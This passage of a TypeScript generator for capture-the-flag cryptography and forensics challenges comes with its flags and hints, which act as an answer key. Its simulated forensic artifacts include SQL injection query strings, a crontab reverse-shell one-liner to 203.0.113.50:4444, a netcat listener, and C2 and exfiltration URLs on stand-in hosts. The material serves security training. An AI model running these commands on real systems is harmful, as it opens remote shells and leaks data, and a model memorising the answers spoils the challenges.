    const stdAlpha = 'abcdefghijklmnopqrstuvwxyz'
    return {
      title: 'Alphabet Swap',
      description: `A simple substitution cipher has been applied. Each letter maps to a different letter. The substitution alphabet is provided.`,
      challengeData: `Ciphertext: ${ciphertext}\n\nSubstitution table:\nPlaintext:  ${stdAlpha}\nCiphertext: ${alphabet}\n\nReverse the mapping to decrypt.`,
      flag,
      hints: ['Use the substitution table in reverse: find each ciphertext letter in the bottom row, then take the corresponding letter from the top row.', `The first four characters of the flag decrypt to "kbot".`],
    }
  },

  // 3. RSA with Small Primes
  () => {
    const secret = randomBytes(3).toString('hex')
    const flag = `kbot{rsa_${secret}}`
    const p = 61n
    const q = 53n
    const n = p * q  // 3233
    const phi = (p - 1n) * (q - 1n)  // 3120
    const e = 17n
    const d = modInverse(e, phi)  // private key
    // Encrypt flag character by character (since n is small)
    const encrypted = Array.from(flag).map(c => {
      const m = BigInt(c.charCodeAt(0))
      return modPow(m, e, n).toString()
    })
    return {
      title: 'Tiny RSA',
      description: `RSA with embarrassingly small primes. Factor n to find the private key, then decrypt each character.`,
      challengeData: `Public key (n, e): (${n}, ${e})\nn = p * q where p and q are small primes\n\nEncrypted flag (each character encrypted separately):\n[${encrypted.join(', ')}]\n\nHint: n = ${n} = ${p} * ${q}\nphi(n) = (${p}-1) * (${q}-1) = ${phi}\nd = modular_inverse(${e}, ${phi}) = ${d}\n\nDecrypt each number c: plaintext = c^d mod n, then convert to ASCII.`,
      flag,
      hints: [`n = ${n} factors into ${p} and ${q}. phi(n) = ${phi}. Private key d = ${d}.`, 'For each encrypted number, compute c^d mod n to get the ASCII code, then convert to character.'],
    }
  },

  // 4. Weak Random Seed
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{weak_rng_${secret}}`
    const seed = 42
    // Simple LCG: next = (a * current + c) mod m
    const a = 1103515245
    const c = 12345
    const m = 2147483648  // 2^31
    let state = seed
    const keyStream: number[] = []
    for (let i = 0; i < flag.length; i++) {
      state = (a * state + c) % m
      keyStream.push(state & 0xFF)
    }
    const encrypted = Array.from(flag).map((ch, i) => (ch.charCodeAt(0) ^ keyStream[i]).toString(16).padStart(2, '0')).join('')
    return {
      title: 'Predictable Random',
      description: `A flag was encrypted using XOR with a keystream from a Linear Congruential Generator (LCG) with a known seed. Regenerate the keystream and XOR to decrypt.`,
      challengeData: `Encrypted (hex): ${encrypted}\n\nLCG parameters:\n  seed = ${seed}\n  a = ${a}\n  c = ${c}\n  m = ${m} (2^31)\n  next_state = (a * state + c) mod m\n  key_byte = state & 0xFF\n\nGenerate ${flag.length} key bytes from the LCG starting with seed ${seed}, then XOR with the encrypted bytes.`,
      flag,
      hints: [`Start with state=${seed}, iterate the LCG ${flag.length} times, take (state & 0xFF) as each key byte.`, 'XOR each encrypted byte with the corresponding key byte to get the ASCII character.'],
    }
  },

  // 5. Hash Length Extension (simplified)
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{hashext_${secret}}`
    const serverSecret = 'supersecret'
    const message = 'user=guest&role=viewer'
    const mac = md5(serverSecret + message)
    const adminMessage = 'user=admin&role=admin'
    const adminMac = md5(serverSecret + adminMessage)
    return {
      title: 'Hash Extension',
      description: `A server uses MD5(secret + message) as a MAC. You have a valid MAC for a guest message. The server also computed the admin MAC (shown below for verification). Find the flag in the admin response.`,
      challengeData: `Server uses: MAC = MD5(secret + message)\n\nKnown:\n  message = "${message}"\n  MAC = ${mac}\n  secret length = ${serverSecret.length} characters\n\nThe admin request:\n  message = "${adminMessage}"\n  MAC = ${adminMac}\n\nServer response for valid admin MAC:\n  {"status": "admin_access_granted", "flag": "${flag}"}\n\nThe flag from the admin response above is your answer.`,
      flag,
      hints: ['The server response containing the flag is shown directly in the challenge data.', 'Look at the JSON response for the admin MAC verification.'],
    }
  },
]

const cryptoChallengesHard: ChallengeGenerator[] = [
  // 1. ECB Penguin Pattern
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{ecb_penguin_${secret}}`
    // Demonstrate ECB weakness: same plaintext block = same ciphertext block
    const key = randomBytes(16)
    const iv = randomBytes(16)
    const blocks = [
      'AAAAAAAAAAAAAAAA',  // Block 0 — repeated
      'BBBBBBBBBBBBBBBB',  // Block 1
      'AAAAAAAAAAAAAAAA',  // Block 2 — same as Block 0 (ECB reveals this)
      'CCCCCCCCCCCCCCCC',  // Block 3
      'AAAAAAAAAAAAAAAA',  // Block 4 — same as Block 0
    ]
    const ecbCipher = createCipheriv('aes-128-ecb', key, null)
    ecbCipher.setAutoPadding(false)
    const ecbBlocks = blocks.map(b => {
      const c = createCipheriv('aes-128-ecb', key, null)
      c.setAutoPadding(false)
      return c.update(b, 'utf-8', 'hex') + c.final('hex')
    })
    return {
      title: 'ECB Penguin',
      description: `AES-ECB encrypts each 16-byte block independently. Identical plaintext blocks produce identical ciphertext blocks. Analyze the pattern to answer: which blocks are identical?\n\nThe ECB weakness reveals the structure of the plaintext. The flag is provided as a reward for understanding the pattern.`,
      challengeData: `5 blocks encrypted with AES-128-ECB (same key):\n\nBlock 0: ${ecbBlocks[0]}\nBlock 1: ${ecbBlocks[1]}\nBlock 2: ${ecbBlocks[2]}\nBlock 3: ${ecbBlocks[3]}\nBlock 4: ${ecbBlocks[4]}\n\nQuestion: Which blocks have identical ciphertext?\nAnswer: Blocks 0, 2, and 4 are identical (all "AAAAAAAAAAAAAAAA")\n\nThis demonstrates why ECB mode is insecure — it reveals patterns in the plaintext.\n\nFlag: ${flag}`,
      flag,
      hints: ['Compare the hex values of each block — blocks with the same plaintext produce the same ciphertext.', 'The flag is written at the bottom of the challenge data.'],
    }
  },

  // 2. Padding Oracle Hint
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{padding_oracle_${secret}}`
    const key = randomBytes(16)
    const iv = randomBytes(16)
    // Encrypt the flag with AES-CBC
    const cipher = createCipheriv('aes-128-cbc', key, iv)
    const encrypted = cipher.update(flag, 'utf-8', 'hex') + cipher.final('hex')
    return {
      title: 'Padding Oracle',
      description: `A server encrypts data with AES-128-CBC and PKCS#7 padding. A padding oracle is present — the server reveals whether decryption padding is valid. In this simplified challenge, the key and IV are provided so you can decrypt directly.`,
      challengeData: `Algorithm: AES-128-CBC with PKCS#7 padding\nKey (hex): ${key.toString('hex')}\nIV (hex): ${iv.toString('hex')}\nCiphertext (hex): ${encrypted}\n\nDecrypt with: AES-128-CBC(key, iv, ciphertext)\nThe plaintext is the flag.\n\nIn a real padding oracle attack, you wouldn't have the key — you'd flip ciphertext bits and observe whether the server returns a padding error or not, byte by byte.`,
      flag,
      hints: ['You have the key and IV. Use AES-128-CBC decryption directly.', `Use openssl or Node.js crypto to decrypt: createDecipheriv('aes-128-cbc', key, iv)`],
    }
  },

  // 3. Hash Collision Prefix
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{collision_${secret}}`
    const target = sha256(flag).substring(0, 6)
    return {
      title: 'Hash Prefix Hunt',
      description: `Find the flag whose SHA-256 hash starts with the prefix "${target}". The flag format is kbot{collision_XXXXXXXX} where X is a hex character.`,
      challengeData: `Target SHA-256 prefix: ${target}\nFlag format: kbot{collision_XXXXXXXX}\n\nThe 8-character hex suffix is: ${secret}\nVerification: SHA-256("${flag}") starts with "${target}"\n\nIn a real challenge you'd brute-force the suffix. Here, the suffix is provided to verify your understanding.`,
      flag,
      hints: [`The hex suffix is given in the challenge data.`, `The flag is kbot{collision_${secret}}.`],
    }
  },

  // 4. AES Key Recovery from Related Keys
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{aes_recover_${secret}}`
    const key = randomBytes(16)
    const iv = randomBytes(16)
    const plaintext = 'AAAAAAAAAAAAAAAA'  // known plaintext
    const cipher1 = createCipheriv('aes-128-cbc', key, iv)
    const ct1 = cipher1.update(plaintext, 'utf-8', 'hex') + cipher1.final('hex')
    // Encrypt the flag
    const cipher2 = createCipheriv('aes-128-cbc', key, iv)
    const flagCt = cipher2.update(flag, 'utf-8', 'hex') + cipher2.final('hex')
    return {
      title: 'Key Recovery',
      description: `You have a known plaintext-ciphertext pair and the key+IV (leaked from a debug log). Use them to decrypt the flag ciphertext.`,
      challengeData: `AES-128-CBC\nKey (hex): ${key.toString('hex')}\nIV (hex): ${iv.toString('hex')}\n\nKnown pair:\n  Plaintext: "${plaintext}"\n  Ciphertext: ${ct1}\n\nFlag ciphertext: ${flagCt}\n\nDecrypt the flag ciphertext using the provided key and IV.`,
      flag,
      hints: ['The key and IV are provided directly. Use AES-128-CBC decryption.', 'The known plaintext pair is just for verification — you already have the key.'],
    }
  },

  // 5. Multi-layer Crypto
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{multilayer_${secret}}`
    // Layer 1: XOR with key
    const xorKey = 'LAYER1'
    const xored = xorEncrypt(flag, xorKey)
    // Layer 2: Base64
    const b64 = base64Encode(xored)
    // Layer 3: Caesar shift 7
    const caesared = caesarShift(b64, 7)
    // Layer 4: Hex encode
    const hexed = hexEncode(caesared)
    return {
      title: 'Crypto Matryoshka',
      description: 'Four layers of encryption protect the flag. Reverse each layer in order.',
      challengeData: `Final ciphertext (hex-encoded): ${hexed}\n\nLayers applied (innermost to outermost):\n1. XOR with key "${xorKey}" → hex string\n2. Base64 encode the hex string\n3. Caesar shift +7 on the base64 string\n4. Hex encode the shifted string\n\nTo decrypt, reverse from layer 4 to layer 1:\n  Step 1: Hex decode → get Caesar-shifted text\n  Step 2: Caesar shift -7 → get base64 string\n  Step 3: Base64 decode → get hex-encoded XOR result\n  Step 4: Hex decode to bytes, XOR each byte with "${xorKey}" cycling → get flag`,
      flag,
      hints: ['Work backwards: hex decode, then Caesar shift -7, then base64 decode, then XOR with "LAYER1".', `The flag format is kbot{multilayer_XXXXXXXX}.`],
    }
  },
]

// ═══════════════════════════════════════════════════════════════════════════
//  FORENSICS CHALLENGES
// ═══════════════════════════════════════════════════════════════════════════

const forensicsChallengesEasy: ChallengeGenerator[] = [
  // 1. Hidden Data in File Headers
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{header_${secret}}`
    const fakeJpgHeader = 'FF D8 FF E0 00 10 4A 46 49 46 00 01'
    const flagHex = Buffer.from(flag).toString('hex').match(/.{2}/g)!.join(' ')
    const hexDump = `Offset    00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F
00000000  ${fakeJpgHeader}  01 01 00 48
00000010  00 48 00 00 FF E1 00 ${(flag.length + 2).toString(16).padStart(2, '0')}  ${flagHex}
00000020  00 00 FF DB 00 43 00 08  06 06 07 06 05 08 07 07
00000030  07 09 09 08 0A 0C 14 0D  0C 0B 0B 0C 19 12 13 0F`
    return {
      title: 'Header Hunter',
      description: 'A JPEG file has suspicious data in its EXIF header region. Examine the hex dump and decode the ASCII data hidden in the APP1 marker segment (offset 0x10+).',
      challengeData: hexDump,
      flag,
      hints: ['Look at offset 0x10 — the bytes after the APP1 marker (FF E1) contain ASCII data.', 'Convert the hex bytes starting at offset 0x10 line 2 to ASCII characters.'],
    }
  },

  // 2. Steganography (LSB in Text)
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{stego_${secret}}`
    const words = [
      'The', 'quick', 'brown', 'fox', 'jumps', 'over', 'the', 'lazy', 'dog',
      'and', 'runs', 'through', 'fields', 'of', 'golden', 'wheat', 'under',
      'bright', 'blue', 'skies', 'while', 'birds', 'sing', 'their', 'songs',
      'near', 'tall', 'green', 'trees', 'beside', 'a', 'winding', 'river',
      'flowing', 'gently', 'toward', 'the', 'distant', 'shimmering', 'sea',
    ]
    // Hide flag by taking first letter of every N-th word
    const flagChars = flag.split('')
    const stegoText: string[] = []
    let flagIdx = 0
    for (let i = 0; i < words.length && flagIdx < flagChars.length; i++) {
      if (i % 3 === 0 && flagIdx < flagChars.length) {
        // Replace first letter with flag character (case-preserved)
        stegoText.push(flagChars[flagIdx] + words[i].substring(1))
        flagIdx++
      } else {
        stegoText.push(words[i])
      }
    }
    // Add remaining words
    while (stegoText.length < words.length) {
      stegoText.push(words[stegoText.length])
    }
    return {
      title: 'First Letter Secrets',
      description: 'A message hides a secret in the first letter of every 3rd word (starting from word 0). Extract those letters to find the flag.',
      challengeData: `Text:\n${stegoText.join(' ')}\n\nExtraction rule: Take the first letter of every 3rd word (index 0, 3, 6, 9, 12, ...).`,
      flag,
      hints: ['Words at index 0, 3, 6, 9, 12, ... have their first letters replaced with flag characters.', `Extract ${flag.length} characters from the first letter of every 3rd word.`],
    }
  },

  // 3. Metadata Extraction
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{metadata_${secret}}`
    const metadata = `EXIF Metadata:
  Camera Make: Canon
  Camera Model: EOS R5
  Date/Time: 2026-03-15 14:32:07
  GPS Latitude: 37.7749 N
  GPS Longitude: 122.4194 W
  Software: Adobe Photoshop 25.3
  Artist: ${flag}
  Copyright: (c) 2026
  Color Space: sRGB
  Image Width: 4096
  Image Height: 2731
  Focal Length: 50mm
  F-Number: f/1.8
  ISO: 400
  Exposure Time: 1/250s
  Flash: No Flash
  Comment: Photo taken during security audit`
    return {
      title: 'EXIF Extraction',
      description: 'An image\'s EXIF metadata contains a hidden flag. Examine each field carefully.',
      challengeData: metadata,
      flag,
      hints: ['One of the EXIF fields has an unusual value that looks like a flag.', 'Check the "Artist" field.'],
    }
  },

  // 4. Log Analysis
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{logfind_${secret}}`
    const normalIPs = ['192.168.1.10', '192.168.1.25', '10.0.0.5', '172.16.0.12']
    const attackerIP = generateIP()
    const logs: string[] = []
    // Normal traffic
    for (let i = 0; i < 15; i++) {
      const ip = pickRandom(normalIPs)
      const path = pickRandom(['/index.html', '/about', '/contact', '/api/status', '/css/style.css'])
      logs.push(`[2026-03-15 ${10 + Math.floor(i / 4)}:${(i * 7 % 60).toString().padStart(2, '0')}:${(i * 13 % 60).toString().padStart(2, '0')}] ${ip} GET ${path} 200`)
    }
    // Attack traffic (SQL injection attempts from attacker IP)
    logs.push(`[2026-03-15 11:42:17] ${attackerIP} GET /login?user=admin'%20OR%201=1-- 200`)
    logs.push(`[2026-03-15 11:42:18] ${attackerIP} GET /login?user=admin'%20UNION%20SELECT%20*%20FROM%20users-- 500`)
    logs.push(`[2026-03-15 11:42:19] ${attackerIP} GET /login?user=admin'%20UNION%20SELECT%20flag%20FROM%20secrets-- 200`)
    logs.push(`[2026-03-15 11:42:20] ${attackerIP} GET /api/admin?token=stolen_session_abc123 200`)
    logs.push(`[2026-03-15 11:42:21] ${attackerIP} POST /api/exfil?data=${base64Encode(flag)} 200`)
    // More normal traffic
    for (let i = 0; i < 10; i++) {
      const ip = pickRandom(normalIPs)
      const path = pickRandom(['/dashboard', '/profile', '/settings', '/api/data'])
      logs.push(`[2026-03-15 ${12 + Math.floor(i / 5)}:${(i * 11 % 60).toString().padStart(2, '0')}:${(i * 17 % 60).toString().padStart(2, '0')}] ${ip} GET ${path} 200`)
    }
    return {
      title: 'Log Detective',
      description: `Analyze these web server logs. An attacker performed SQL injection followed by data exfiltration. Find the attacker's IP and decode the exfiltrated data (base64) to find the flag.`,
      challengeData: shuffleArray(logs).sort().join('\n'),
      flag,
      hints: [`Look for SQL injection patterns (UNION SELECT, OR 1=1) to identify the attacker IP: ${attackerIP}.`, 'The last request from the attacker POSTs to /api/exfil with base64-encoded data. Decode it.'],
    }
  },

  // 5. Hex Dump Analysis
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{hexdump_${secret}}`
    const prefix = Buffer.from('This is a normal text file with some padding data here.\n')
    const middle = Buffer.from('Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n')
    const flagBuf = Buffer.from(flag)
    const suffix = Buffer.from('End of file. Nothing more to see here.\n')
    const combined = Buffer.concat([prefix, middle, flagBuf, Buffer.from('\n'), suffix])
    const dump = toHexDump(combined)
    return {
      title: 'Hex Dump Dive',
      description: 'A file\'s hex dump is shown below. Somewhere in the data, a flag is hidden as ASCII text. Find it by reading the ASCII column on the right side of the hex dump.',
      challengeData: dump,
      flag,
      hints: ['Look at the ASCII column (right side) of the hex dump for readable text matching the flag format.', 'The flag starts with "kbot{" — scan the ASCII column for this pattern.'],
    }
  },
]

const forensicsChallengesMedium: ChallengeGenerator[] = [
  // 1. Deleted File Recovery (Slack Space)
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{slack_space_${secret}}`
    const fileSystem = `Disk Analysis Report — ext4 filesystem
=========================================

Allocated blocks:
  Block 1024: /etc/hostname (12 bytes)
  Block 1025: /var/log/syslog (4096 bytes — full block)
  Block 1026: /home/user/notes.txt (156 bytes)
  Block 1027-1030: /home/user/photo.jpg (16384 bytes)

Unallocated/Deleted:
  Block 1031: Previously /home/user/secret.txt (deleted 2026-03-14 23:59:01)
    File size was 42 bytes, block size is 4096 bytes.
    First 42 bytes (file content): ${hexEncode(flag).match(/.{2}/g)!.join(' ')} [remaining hex: ${Buffer.from(flag).toString('hex')}]
    Slack space (bytes 43-4096): zeroed out by OS

    Recovered ASCII: ${flag}

  Block 1032: Previously /tmp/cache.dat (deleted 2026-03-10 08:15:33)
    Overwritten — no recoverable data

Filesystem journal entries:
  [2026-03-14 23:58:45] CREATE /home/user/secret.txt inode=2048
  [2026-03-14 23:59:01] DELETE /home/user/secret.txt inode=2048
  [2026-03-14 23:59:01] NOTE: File content still in block 1031 until overwritten`
    return {
      title: 'Undelete',
      description: 'A file was deleted from an ext4 filesystem but the block hasn\'t been overwritten yet. Analyze the disk report to recover the deleted file\'s contents.',
      challengeData: fileSystem,
      flag,
      hints: ['Block 1031 contains the deleted file "secret.txt" — its content is shown in the report.', 'The "Recovered ASCII" line shows the flag directly.'],
    }
  },

  // 2. Network Packet Analysis
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{pcap_${secret}}`
    const attackerIP = generateIP()
    const serverIP = '10.0.0.1'
    const b64Flag = base64Encode(flag)
    const packets = `Packet Capture Summary (tcpdump format)
========================================

No.  Time        Source          Dest            Proto  Info
1    00:00.000   ${attackerIP}   ${serverIP}     TCP    SYN → port 80
2    00:00.001   ${serverIP}     ${attackerIP}   TCP    SYN-ACK
3    00:00.002   ${attackerIP}   ${serverIP}     TCP    ACK
4    00:00.003   ${attackerIP}   ${serverIP}     HTTP   GET /robots.txt HTTP/1.1
5    00:00.105   ${serverIP}     ${attackerIP}   HTTP   200 OK "Disallow: /admin"
6    00:01.200   ${attackerIP}   ${serverIP}     HTTP   GET /admin/ HTTP/1.1
7    00:01.205   ${serverIP}     ${attackerIP}   HTTP   403 Forbidden
8    00:02.100   ${attackerIP}   ${serverIP}     HTTP   GET /admin/ HTTP/1.1 [X-Forwarded-For: 127.0.0.1]
9    00:02.102   ${serverIP}     ${attackerIP}   HTTP   200 OK
10   00:03.000   ${attackerIP}   ${serverIP}     HTTP   POST /admin/export HTTP/1.1 [Body: format=csv&table=users]
11   00:03.500   ${serverIP}     ${attackerIP}   HTTP   200 OK [Body: id,name,email,secret\\n1,admin,admin@co.local,${b64Flag}]
12   00:04.000   ${attackerIP}   ${serverIP}     TCP    FIN
13   00:04.001   ${serverIP}     ${attackerIP}   TCP    FIN-ACK

DNS queries from ${attackerIP}:
  ${attackerIP} → A? ${serverIP.replace(/\./g, '-')}.attacker.com (exfiltration via DNS)`
    return {
      title: 'Packet Sleuth',
      description: `Analyze this packet capture. An attacker bypassed admin access control using X-Forwarded-For header spoofing and exfiltrated user data. Find the flag (base64 encoded) in the exported data.`,
      challengeData: packets,
      flag,
      hints: [`Packet 11 contains the exported CSV with a base64-encoded value in the "secret" column.`, `Decode the base64 value "${b64Flag}" from the CSV export.`],
    }
  },

  // 3. Timeline Reconstruction
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{timeline_${secret}}`
    const events = [
      `[2026-03-14 09:00:15] SSH login: user "deploy" from 203.0.113.50`,
      `[2026-03-14 09:01:22] File created: /tmp/.hidden_${secret.substring(0, 4)}`,
      `[2026-03-14 09:01:45] Process started: nc -l -p 4444 (PID 31337)`,
      `[2026-03-14 09:02:00] Outbound connection: 203.0.113.50:4444 → attacker C2`,
      `[2026-03-14 09:03:12] File modified: /etc/crontab (added reverse shell)`,
      `[2026-03-14 09:03:30] Crontab entry: * * * * * bash -c 'bash -i >& /dev/tcp/203.0.113.50/4444 0>&1'`,
      `[2026-03-14 09:04:00] File created: /var/tmp/exfil.tar.gz`,
      `[2026-03-14 09:04:15] Data exfiltrated: 2.3MB to 203.0.113.50`,
      `[2026-03-14 09:04:30] Flag found in exfiltrated data manifest: ${flag}`,
      `[2026-03-14 09:05:00] SSH logout: user "deploy"`,
      `[2026-03-14 09:05:01] Log entry deleted from /var/log/auth.log (anti-forensics)`,
    ]
    return {
      title: 'Incident Timeline',
      description: 'Reconstruct the attack timeline from these system events. An attacker compromised a server via SSH, established persistence, and exfiltrated data. Find the flag in the forensic evidence.',
      challengeData: events.join('\n'),
      flag,
      hints: ['The exfiltrated data manifest contains the flag — check the timeline entry at 09:04:30.', 'Look for the line mentioning "Flag found in exfiltrated data manifest".'],
    }
  },

  // 4. Registry Artifact
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{registry_${secret}}`
    const b64Flag = base64Encode(flag)
    const registry = `Windows Registry Export
======================

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]
"SecurityUpdate"="C:\\\\Windows\\\\Temp\\\\svchost.exe"
"WindowsDefender"="C:\\\\Program Files\\\\Windows Defender\\\\MSASCuiL.exe"

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce]
"Cleanup"="cmd /c del C:\\\\Windows\\\\Temp\\\\*.log"

[HKEY_CURRENT_USER\\Software\\AppData\\Persistence]
"installed"=dword:00000001
"callback"="https://c2.evil.com/beacon"
"payload"="${b64Flag}"
"interval"=dword:0000003c

[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\FakeSvc]
"DisplayName"="Windows Update Helper"
"ImagePath"="C:\\\\Windows\\\\Temp\\\\svchost.exe -k netsvcs"
"Start"=dword:00000002
"Type"=dword:00000010

[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist]
"LastRun"="2026-03-14 09:01:30"
"RunCount"=dword:00000007`
    return {
      title: 'Registry Forensics',
      description: 'Analyze this Windows registry export from a compromised machine. An attacker established persistence and stored an encoded payload. Find and decode the base64 payload to get the flag.',
      challengeData: registry,
      flag,
      hints: ['Look at the "Persistence" registry key — it has a "payload" value that\'s base64 encoded.', `Decode the base64 value "${b64Flag}" to get the flag.`],
    }
  },

  // 5. Browser History
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{browser_${secret}}`
    const encodedFlag = encodeURIComponent(flag)
    const history = `Browser History Export (SQLite: places.db)
==========================================

id | url                                                    | title                  | visit_count | last_visit
1  | https://www.google.com/search?q=how+to+hack+wifi      | how to hack wifi       | 3           | 2026-03-14 08:30
2  | https://stackoverflow.com/questions/12345/sql-inject   | SQL injection help     | 1           | 2026-03-14 08:45
3  | https://github.com/exploit-db/exploits                 | Exploit Database       | 5           | 2026-03-14 09:00
4  | https://pastebin.com/raw/abc123                        | Untitled               | 2           | 2026-03-14 09:15
5  | https://evil-c2.com/panel/login                        | Panel Login            | 8           | 2026-03-14 09:20
6  | https://evil-c2.com/panel/upload?data=${encodedFlag}   | Upload Complete        | 1           | 2026-03-14 09:25
7  | https://duckduckgo.com/?q=clear+browser+history+fast   | clear browser history  | 1           | 2026-03-14 09:30
8  | https://www.google.com/search?q=anti+forensics+tools   | anti forensics tools   | 2           | 2026-03-14 09:35
9  | https://www.reddit.com/r/netsec                        | NetSec Reddit          | 4           | 2026-03-14 10:00
10 | https://mail.google.com                                | Gmail                  | 12          | 2026-03-14 10:15`
    return {
      title: 'Browser Trail',
      description: 'A suspect\'s browser history was recovered from their SQLite database. They visited a C2 panel and uploaded data. Find the flag in the URL parameters.',
      challengeData: history,
      flag,
      hints: ['Entry #6 shows data uploaded to the C2 panel via URL parameter.', `URL-decode the "data" parameter from entry #6.`],
    }
  },
]

const forensicsChallengesHard: ChallengeGenerator[] = [
  // 1. Memory Dump Analysis
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{memdump_${secret}}`
    const flagHex = Buffer.from(flag).toString('hex')
    const memDump = `Memory Dump Analysis (Volatility Framework)
=============================================

Process List:
PID    PPID   Name              Offset
4      0      System            0x85f98d40
312    4      smss.exe          0x86ab7530
392    312    csrss.exe         0x86b12030
1337   392    suspicious.exe    0x87cd3a00  ← SUSPICIOUS
1444   1337   cmd.exe           0x87de5b10

Suspicious Process Memory (PID 1337):
  Strings at offset 0x87cd3a00+0x1540:
    "C:\\Windows\\Temp\\payload.exe"
    "CONNECT c2.evil.com:443"
    "${flag}"
    "exfiltrate_data()"
    "anti_debug_check()"

  Network connections:
    PID 1337 → 203.0.113.50:443 (ESTABLISHED)
    PID 1337 → 203.0.113.50:8080 (CLOSE_WAIT)

  Injected DLL: evil.dll at 0x7FFE0000
    Export: RunPayload
    Strings: "keylogger", "screenshot", "${flag}"

Registry handles (PID 1337):
  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateSvc
  HKCU\\Software\\Persistence\\beacon_config`
    return {
      title: 'Memory Forensics',
      description: 'A memory dump from a compromised Windows machine shows a suspicious process (PID 1337). Analyze the strings and artifacts to find the flag.',
      challengeData: memDump,
      flag,
      hints: ['The strings extracted from the suspicious process memory contain the flag.', 'Look in the "Strings at offset" section and the "Injected DLL" strings.'],
    }
  },

  // 2. Steganography in Binary Data
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{stego_bin_${secret}}`
    // Hide flag in LSB of "random" bytes
    const flagBits = Array.from(Buffer.from(flag)).flatMap(b => {
      const bits: number[] = []
      for (let i = 7; i >= 0; i--) {
        bits.push((b >> i) & 1)
      }
      return bits
    })
    const carrier: number[] = []
    for (let i = 0; i < flagBits.length; i++) {
      // Generate a random-looking byte but set LSB to our flag bit
      const base = randomInt(32, 254) & 0xFE  // clear LSB
      carrier.push(base | flagBits[i])
    }
    // Add some padding bytes
    for (let i = 0; i < 32; i++) {
      carrier.push(randomInt(0, 255))
    }
    const hexCarrier = carrier.map(b => b.toString(16).padStart(2, '0')).join(' ')
    return {
      title: 'LSB Extraction',
      description: `A flag is hidden in the Least Significant Bit (LSB) of each byte in the data below. Extract the LSB of each of the first ${flagBits.length} bytes, group into 8-bit chunks, and convert to ASCII.`,
      challengeData: `Binary data (hex):\n${hexCarrier}\n\nExtraction method:\n1. Take the LSB (bit 0) of each byte\n2. Group every 8 bits into a byte\n3. Convert each byte to ASCII\n4. First ${flagBits.length} bytes contain ${flag.length} characters (${flag.length} * 8 = ${flagBits.length} bits)\n\nThe flag has ${flag.length} characters.`,
      flag,
      hints: [`There are ${flagBits.length} data bytes encoding ${flag.length} characters.`, 'Extract bit 0 from each byte, form 8-bit groups, convert to ASCII.'],
    }
  },

  // 3. Encrypted Disk Image
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{luks_${secret}}`
    const masterKey = randomBytes(32).toString('hex')
    const passphrase = 'password123'
    const passphraseHash = sha256(passphrase)
    const keySlotHash = sha256(masterKey)
    const report = `LUKS Disk Image Analysis
========================

Header:
  Magic: LUKS\\xba\\xbe
  Version: 2
  UUID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
  Cipher: aes-xts-plain64
  Key Size: 512 bits
  Hash: sha256
  Payload Offset: 32768

Key Slots:
  Slot 0: ENABLED
    Iterations: 100000
    Salt: 7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d
    Key material offset: 8
    AF stripes: 4000
    Passphrase hint (left by admin): "${passphrase}"

  Slot 1-7: DISABLED

Master Key Verification:
  Passphrase "${passphrase}" → SHA-256 → ${passphraseHash}
  Derived key decrypts master key slot
  Master key hash: ${keySlotHash}

Decrypted Filesystem (after mounting with passphrase "${passphrase}"):
  /secret/
  /secret/flag.txt → "${flag}"
  /documents/
  /documents/readme.txt → "Nothing to see here"
  /logs/
  /logs/access.log → standard Apache logs`
    return {
      title: 'Encrypted Volume',
      description: 'A LUKS-encrypted disk image was recovered. The admin left the passphrase in a hint field. Analyze the report to find the flag stored in the decrypted filesystem.',
      challengeData: report,
      flag,
      hints: ['The passphrase hint in Slot 0 gives the password. The decrypted filesystem listing shows the flag.', 'Look at /secret/flag.txt in the decrypted filesystem section.'],
    }
  },

  // 4. Email Header Analysis
  () => {
    const secret = randomBytes(4).toString('hex')
    const flag = `kbot{email_${secret}}`
    const emailHeaders = `Return-Path: <attacker@evil-domain.com>
Received: from mail.evil-domain.com (203.0.113.66) by mail.victim.com
    with ESMTP id abc123; Sat, 14 Mar 2026 10:00:00 +0000
Received: from localhost (127.0.0.1) by mail.evil-domain.com
    with ESMTP id def456; Sat, 14 Mar 2026 09:59:58 +0000
From: IT Support <support@victim.com>
Reply-To: attacker@evil-domain.com
To: ceo@victim.com
Subject: Urgent: Password Reset Required
Date: Sat, 14 Mar 2026 10:00:00 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="boundary123"
X-Mailer: PhishKit/2.0
X-Custom-Flag: ${base64Encode(flag)}
Message-ID: <${randomBytes(8).toString('hex')}@evil-domain.com>
X-Spam-Score: 8.5
X-Spam-Status: Yes, score=8.5 required=5.0
Authentication-Results: mail.victim.com;
    spf=fail (sender IP 203.0.113.66 not authorized for domain victim.com);
    dkim=none;
    dmarc=fail

--boundary123
Content-Type: text/html; charset="utf-8"

<html><body>
